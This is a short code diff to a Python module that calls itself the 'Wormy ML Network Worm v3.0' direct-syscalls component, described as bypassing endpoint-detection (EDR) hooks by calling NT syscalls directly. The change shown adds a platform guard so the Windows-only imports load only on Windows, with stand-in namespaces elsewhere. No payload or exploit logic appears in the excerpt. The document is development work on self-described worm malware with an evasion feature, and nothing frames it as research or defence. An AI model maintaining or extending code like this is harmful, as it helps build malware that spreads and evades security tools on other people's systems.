@@ -3,17 +3,29 @@ Wormy ML Network Worm v3.0 - Direct Syscalls Module
 Bypass userland EDR hooks by calling NT syscalls directly via mmap'd stubs.
 """
 
-import ctypes
-import ctypes.wintypes
-import mmap
 import os
 import platform
-import struct
 import sys
 from typing import Dict, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
+
+# FIX: Platform guard - only import Windows-specific modules on Windows
+_IS_WINDOWS = platform.system() == "Windows"
+
+if _IS_WINDOWS:
+    import ctypes
+    import ctypes.wintypes
+    import mmap
+    import struct
+else:
+    # Create dummy module to prevent AttributeError
+    import types
+    ctypes = types.SimpleNamespace()
+    ctypes.wintypes = types.SimpleNamespace()
+    mmap = types.SimpleNamespace()
+    struct = types.SimpleNamespace()
 
 
 class DirectSyscalls:
